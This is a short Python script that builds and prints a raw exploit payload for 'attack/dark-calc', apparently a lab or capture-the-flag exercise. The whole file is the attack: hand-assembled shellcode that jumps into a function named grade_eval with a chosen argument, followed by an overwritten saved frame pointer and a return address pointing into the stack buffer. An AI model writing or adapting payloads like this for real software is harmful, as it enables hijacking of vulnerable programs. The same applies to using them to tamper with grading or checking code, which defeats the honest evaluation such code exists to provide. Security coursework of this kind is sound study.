#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc."""
import sys

# shellcode (15 bytes, then 1 byte padding to fill the 16-byte buffer):
#   mov ebx, 0x401a87   ; grade_eval
#   push 0x401c1f       ; __wrap_main+0x11: mov rsp,r12; pop r12; ret
#   push 4; pop rdi     ; edi = 4
#   jmp rbx
# grade_eval's `mov %edi,-0x4(%rbp)` clobbers 0xfdc-0xfdf, so the code after
# grade_eval returns must not live there; the pushed 0x401c1f is the return
# target instead of a `ret` byte inside the buffer.
payload = (
    b"\xbb\x87\x1a\x40\x00"                # mov ebx, 0x401a87
    b"\x68\x1f\x1c\x40\x00"                # push 0x401c1f
    b"\x6a\x04"                            # push 4
    b"\x5f"                                # pop rdi
    b"\xff\xe3"                            # jmp rbx
    b"\x00"                                # pad to 16 bytes
    + b"\xf0\x0f\x80\x00\x10\x72\x00\x00"  # saved rbp = main's rbp
    + b"\xd0\x0f\x80\x00\x10\x72\x00\x00"  # return address = expression (0x721000800fd0)
)

sys.stdout.buffer.write(payload)
